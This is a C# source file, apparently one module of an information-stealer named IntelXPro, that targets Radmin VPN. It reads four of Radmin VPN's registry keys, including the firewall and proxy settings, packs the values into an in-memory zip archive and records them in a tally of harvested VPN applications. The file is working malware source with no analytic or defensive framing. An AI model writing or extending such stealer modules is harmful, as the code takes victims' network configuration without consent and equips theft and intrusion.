using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.General;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Vpn
{
    internal class RadminVPN : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            List<string> list = new List<string>();
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN", writable: false))
            {
                list.AddRange(RegistryParser.ParseKey(key));
            }
            using (RegistryKey key2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0", writable: false))
            {
                list.AddRange(RegistryParser.ParseKey(key2));
            }
            using (RegistryKey key3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Firewall", writable: false))
            {
                list.AddRange(RegistryParser.ParseKey(key3));
            }
            using (RegistryKey key4 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Proxy", writable: false))
            {
                list.AddRange(RegistryParser.ParseKey(key4));
            }
            if (list.Any())
            {
                string text = "RadminVPN\\Registry.txt";
                zip.AddTextFile(text, string.Join("\n", list));
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "RadminVPN";
                counterApplications.Files.Add("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN => " + text);
                counterApplications.Files.Add("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0 => " + text);
                counterApplications.Files.Add("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Firewall => " + text);
                counterApplications.Files.Add("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Proxy => " + text);
                counterApplications.Files.Add(text);
                counterApplications.Files.Add("RadminVPN\\");
                counter.Vpns.Add(counterApplications);
            }
        }
    }

}
